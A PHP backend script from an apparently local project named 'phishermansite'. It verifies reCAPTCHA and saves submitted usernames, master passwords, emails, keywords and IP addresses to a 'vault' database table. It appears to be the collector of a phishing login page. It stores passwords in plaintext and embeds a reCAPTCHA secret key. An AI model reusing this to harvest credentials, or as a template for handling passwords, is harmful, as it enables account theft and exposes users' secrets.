<?php

if($_SERVER['REQUEST_METHOD']=="POST"){

    if(isset($_POST['g-recaptcha-response'])){
        $token = $_POST['g-recaptcha-response'];
        $url = 'https://www.google.com/recaptcha/api/siteverify';
        $data = array(
            'secret' => '6LfVrfsoAAAAALGW37jkcamhtMljnWmEWl_IrL0_',
            'response' => $token
        );

        $options = array(
            'http' => array (
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data)
            )
        );

        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        $response = json_decode($result);


        if ($response->success && $response->score >= 0.5){
            echo json_encode(array('success' => true, "msg"=>"You are not a robot", "response"=>$response));
            $conn = new mysqli('localhost', 'root', '', 'phishermansite');
            if ($conn->connect_error) {
                die('Connection Failed : ' . $conn->connect_error);
            }else{
                $Username = $_POST['Username'];
                $MasterPassword = $_POST['MasterPassword'];
                $Email = $_POST['Email'];
                $KeyWord = $_POST["KeyWord"];
                $ipaddr = $_POST["ipaddr"];

                $stmt = $conn->prepare("INSERT INTO vault (Username, MasterPassword, Email, KeyWord, ipaddr) VALUES (?, ?, ?, ?, ?)");
                $stmt->bind_param("sssss", $Username, $MasterPassword, $Email, $KeyWord, $ipaddr);
                $stmt->execute();
                echo "Login successful";
                $stmt->close();
                $conn->close();
                header("Location: http://localhost/phishermansite/VaultLoginPage.php");
                exit;
            }
        
        }else {
            echo json_encode(array('success' => false, 'msg' =>"You are a Robot!", "response"=>$response));
            header("Location: http://localhost/phishermansite/VaultLoginPage.php");
                exit;
        }


    }
}




?>


<?php
    // $Username = $_POST['Username'];
    // $MasterPassword = $_POST['MasterPassword'];
    // $Email = $_POST['Email'];
    // $KeyWord = $_POST["KeyWord"];


    // // Database connection
    // $conn = new mysqli('localhost', 'root', '', 'phishermansite');
    // if ($conn->connect_error) {
    //     die('Connection Failed : ' . $conn->connect_error);
    // }else{
    //     $Username = $_POST['Username'];
    //     $MasterPassword = $_POST['MasterPassword'];
    //     $Email = $_POST['Email'];
    //     $KeyWord = $_POST["KeyWord"];

    //     $stmt = $conn->prepare("INSERT INTO vault (Username, MasterPassword, Email, KeyWord) VALUES (?, ?, ?, ?)");
    //     $stmt->bind_param("ssss", $Username, $MasterPassword, $Email, $KeyWord);
    //     $stmt->execute();
    //     echo "Login successful";
    //     $stmt->close();  
    //     $conn->close();
    // }
        
?>
    